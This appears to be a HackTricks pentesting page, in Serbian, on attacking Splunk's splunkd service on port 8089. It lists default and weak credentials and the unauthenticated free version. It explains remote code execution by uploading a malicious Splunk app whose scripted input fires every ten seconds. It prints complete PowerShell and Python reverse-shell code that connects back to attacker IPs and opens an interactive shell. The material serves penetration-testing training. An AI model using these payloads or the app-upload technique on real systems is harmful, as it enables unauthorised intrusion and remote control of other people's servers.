# 8089 - Pentesting Splunkd

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Osnovne informacije**

* Alat za analizu logova koji se koristi za prikupljanje podataka, analizu i vizualizaciju
* ƒåesto se koristi u bezbednosnom nadzoru i poslovnoj analitici
* Podrazumevani portovi:
* Web server: 8000
* Splunkd usluga: 8089

### Vektori ranjivosti:

1. Iskori≈°ƒáavanje besplatne verzije

* Probna verzija se automatski pretvara u besplatnu verziju nakon 60 dana
* Besplatna verzija nema autentifikaciju
* Potencijalni bezbednosni rizik ako se ne upravlja
* Administratori mogu zanemariti bezbednosne implikacije

2. Slabosti kredencijala

* Starije verzije: Podrazumevani kredencijali `admin:changeme`
* Novije verzije: Kredencijali postavljeni tokom instalacije
* Potencijal za kori≈°ƒáenje slabih lozinki (npr., `admin`, `Welcome`, `Password123`)

3. Moguƒánosti daljinskog izvr≈°enja koda

* Vi≈°e metoda izvr≈°enja koda:
* Server-side Django aplikacije
* REST krajnje taƒçke
* Skriptovani ulazi
* Skripte za upozorenje
* Podr≈°ka za vi≈°e platformi (Windows/Linux)
* Skriptovani ulazi mogu pokretati:
* Bash skripte
* PowerShell skripte
* Batch skripte

Kljuƒçni potencijal za iskori≈°ƒáavanje:

* Skladi≈°tenje osetljivih podataka
* Nedostatak autentifikacije u besplatnoj verziji
* Vi≈°e vektora za potencijalno daljinsko izvr≈°enje koda
* Moguƒánost kori≈°ƒáenja skriptovanih ulaza za kompromitaciju sistema

### Shodan

* `Splunk build`

## RCE

### Kreirajte prilagoƒëenu aplikaciju

Splunk nudi sofisticiranu metodu za daljinsko izvr≈°enje koda putem implementacije prilagoƒëene aplikacije, koristeƒái svoje moguƒánosti skriptovanja na vi≈°e platformi. Osnovna tehnika iskori≈°ƒáavanja se vrti oko kreiranja zlonamerne aplikacije koja mo≈æe izvr≈°avati reverzne ljuske na Windows i Linux sistemima.

Prilagoƒëena aplikacija mo≈æe pokretati **Python, Batch, Bash ili PowerShell skripte**. ≈†tavi≈°e, **Splunk dolazi sa instaliranim Python-om**, tako da ƒáete ƒçak i na **Windows** sistemima moƒái da pokreƒáete python kod.

Mo≈æete koristiti [**ovaj**](https://github.com/0xjpuff/reverse_shell_splunk) primer sa **`bin`** koji sadr≈æi primer za [Python](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/rev.py) i [PowerShell](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/run.ps1). Ili mo≈æete kreirati svoj.

Proces iskori≈°ƒáavanja prati doslednu metodologiju ≈°irom platformi:
```
splunk_shell/
‚îú‚îÄ‚îÄ bin        (reverse shell scripts)
‚îî‚îÄ‚îÄ default    (inputs.conf configuration)
```
Kritiƒçna konfiguraciona datoteka `inputs.conf` omoguƒáava skriptu na sledeƒái naƒçin:

* Postavljanjem `disabled = 0`
* Konfiguri≈°uƒái interval izvr≈°enja od 10 sekundi
* Defini≈°uƒái tip izvora skripte

Implementacija je jednostavna:

1. Kreirati paket zlonamerne aplikacije
2. Postaviti slu≈°alicu (Netcat/socat) na napadaƒçkom raƒçunaru
3. Otpremiti aplikaciju putem Splunk-ovog interfejsa
4. Pokrenuti automatsko izvr≈°enje skripte prilikom otpremanja

Primer Windows PowerShell reverz shell-a:
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()
};
$client.Close()
```
Primer Linux Python reverz shell-a:
```python
import sys, socket, os, pty
ip = "10.10.14.15"
port = "443"
s = socket.socket()
s.connect((ip, int(port)))
[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
pty.spawn('/bin/bash')
```
### RCE & Eskalacija privilegija

Na sledeƒáoj stranici mo≈æete pronaƒái obja≈°njenje kako se ova usluga mo≈æe zloupotrebiti za eskalaciju privilegija i dobijanje postojanosti:

{% content-ref url="../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md" %}
[splunk-lpe-and-persistence.md](../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md)
{% endcontent-ref %}

## Reference

* [https://academy.hackthebox.com/module/113/section/1213](https://academy.hackthebox.com/module/113/section/1213)

{% hint style="success" %}
Uƒçite i ve≈æbajte AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Uƒçite i ve≈æbajte GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr≈æite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru≈æite se** üí¨ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
